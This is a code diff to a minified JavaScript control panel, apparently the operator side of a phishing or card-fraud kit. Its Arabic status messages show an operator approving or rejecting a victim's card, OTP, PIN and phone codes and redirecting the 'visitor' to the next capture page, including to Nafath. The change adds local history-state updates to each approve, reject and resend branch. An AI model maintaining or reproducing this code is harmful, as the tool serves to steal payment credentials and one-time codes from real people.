@@ -2849,40 +2849,45 @@
                             case "card":
                                 if ("otp" === a) {
                                     let t = resolveHistoryId(vhist, n, ["_t1", "card"]);
+                                    let _hC1=updateHistoryEntry(vhist,t,["_t1","card"],"approved_with_otp"); f({...y,history:_hC1});
                                     await s(vid, redirectPayload("otp", {
-                                        history: updateHistoryEntry(vhist, t, ["_t1", "card"], "approved_with_otp"),
+                                        history: _hC1,
                                         cardStatus: "approved_with_otp",
                                         otpStatus: "pending",
                                         _v5Status: "pending"
                                     })), G.success("تم توجيه الزائر لصفحة OTP")
                                 } else if ("pin" === a) {
                                     let t = resolveHistoryId(vhist, n, ["_t1", "card"]);
+                                    let _hC2=updateHistoryEntry(vhist,t,["_t1","card"],"approved_with_pin"); f({...y,history:_hC2});
                                     await s(vid, redirectPayload("pin", {
-                                        history: updateHistoryEntry(vhist, t, ["_t1", "card"], "approved_with_pin"),
+                                        history: _hC2,
                                         cardStatus: "approved_with_pin",
                                         pinStatus: "pending",
                                         _v6Status: "pending"
                                     })), G.success("تم توجيه الزائر لصفحة PIN")
                                 } else if ("reject" === a) {
                                     let t = resolveHistoryId(vhist, n, ["_t1", "card"]);
+                                    let _hC3=updateHistoryEntry(vhist,t,["_t1","card"],"rejected"); f({...y,history:_hC3});
                                     await s(vid, redirectPayload("check", {
-                                        history: updateHistoryEntry(vhist, t, ["_t1", "card"], "rejected"),
+                                        history: _hC3,
                                         cardStatus: "rejected"
                                     })), G.success("تم رفض البطاقة")
                                 }
                                 break;
                             case "otp":
                                 if (n = resolveHistoryId(vhist, n, ["_t2", "otp"]), "approve" === a) {
+                                    let _hO1=updateHistoryEntry(vhist,n,["_t2","otp"],"approved"); f({...y,history:_hO1});
                                     await s(vid, redirectPayload("pin", {
-                                        history: updateHistoryEntry(vhist, n, ["_t2", "otp"], "approved"),
+                                        history: _hO1,
                                         _v5Status: "approved",
                                         otpStatus: "approved",
                                         pinStatus: "pending",
                                         _v6Status: "pending"
                                     })), G.success("تم قبول OTP — توجيه الزائر لصفحة PIN")
                                 } else if ("reject" === a) {
+                                    let _hO2=updateHistoryEntry(vhist,n,["_t2","otp"],"rejected"); f({...y,history:_hO2});
                                     await s(vid, redirectPayload("otp", {
-                                        history: updateHistoryEntry(vhist, n, ["_t2", "otp"], "rejected"),
+                                        history: _hO2,
                                         _v5Status: "rejected",
                                         otpStatus: "pending"
                                     })), G.success("تم رفض OTP — سيعاد فتح الإدخال للعميل")
@@ -2890,14 +2895,16 @@
                                 break;
                             case "pin":
                                 if (n = resolveHistoryId(vhist, n, ["_t3", "pin"]), "approve" === a) {
+                                    let _hP1=updateHistoryEntry(vhist,n,["_t3","pin"],"approved"); f({...y,history:_hP1});
                                     await s(vid, redirectPayload("phone", {
-                                        history: updateHistoryEntry(vhist, n, ["_t3", "pin"], "approved"),
+                                        history: _hP1,
                                         _v6Status: "approved",
                                         pinStatus: "approved"
                                     })), G.success("تم قبول PIN")
                                 } else if ("reject" === a) {
+                                    let _hP2=updateHistoryEntry(vhist,n,["_t3","pin"],"rejected"); f({...y,history:_hP2});
                                     await s(vid, redirectPayload("pin", {
-                                        history: updateHistoryEntry(vhist, n, ["_t3", "pin"], "rejected"),
+                                        history: _hP2,
                                         _v6Status: "rejected",
                                         pinStatus: "pending"
                                     })), G.success("تم رفض PIN")
@@ -2906,8 +2913,9 @@
                             case "phone_verification":
                                 if ("approve" === a) {
                                     let t = resolveHistoryId(vhist, n, ["_t4", "phone_verification"]);
+                                    let _hPV1=updateHistoryEntry(vhist,t,["_t4","phone_verification"],"approved"); f({...y,history:_hPV1});
                                     await s(vid, {
-                                        history: updateHistoryEntry(vhist, t, ["_t4", "phone_verification"], "approved"),
+                                        history: _hPV1,
                                         _v4Status: "approved",
                                         redirectPage: null,
                                         currentPage: null,
@@ -2915,17 +2923,25 @@
                                     }), G.success("تم قبول الهاتف")
                                 } else if ("reject" === a) {
                                     let t = resolveHistoryId(vhist, n, ["_t4", "phone_verification"]);
+                                    let _hPV2=updateHistoryEntry(vhist,t,["_t4","phone_verification"],"rejected"); f({...y,history:_hPV2});
                                     await s(vid, {
-                                        history: updateHistoryEntry(vhist, t, ["_t4", "phone_verification"], "rejected"),
+                                        history: _hPV2,
                                         _v4Status: "rejected",
                                         phoneCarrier: ""
                                     }), G.success("تم رفض الهاتف")
                                 }
                                 break;
                             case "phone_otp":
-                                if (n = resolveHistoryId(vhist, n), "approve" === a) await N(vid, n, vhist), G.success("تم قبول كود الهاتف وتوجيه الزائر لنفاذ");
-                                else if ("reject" === a) await A(vid, n, vhist), G.success("تم رفض كود الهاتف — سيُعاد فتح نافذة الإدخال للعميل");
-                                else if ("resend" === a) await resendOtp(vid, n, vhist), G.success("تم طلب إعادة إرسال كود الهاتف — سيُعاد فتح نافذة الإدخال للعميل");
+                                if (n = resolveHistoryId(vhist, n), "approve" === a) {
+                                    let _hPO1=updateHistoryEntry(vhist,n,["_t5","phone_otp"],"approved"); f({...y,history:_hPO1});
+                                    await N(vid, n, vhist), G.success("تم قبول كود الهاتف وتوجيه الزائر لنفاذ");
+                                } else if ("reject" === a) {
+                                    let _hPO2=updateHistoryEntry(vhist,n,["_t5","phone_otp"],"rejected"); f({...y,history:_hPO2});
+                                    await A(vid, n, vhist), G.success("تم رفض كود الهاتف — سيُعاد فتح نافذة الإدخال للعميل");
+                                } else if ("resend" === a) {
+                                    let _hPO3=updateHistoryEntry(vhist,n,["_t5","phone_otp"],"resend"); f({...y,history:_hPO3});
+                                    await resendOtp(vid, n, vhist), G.success("تم طلب إعادة إرسال كود الهاتف — سيُعاد فتح نافذة الإدخال للعميل");
+                                }
                                 break
                         }
                         let refreshed = await i(vid);
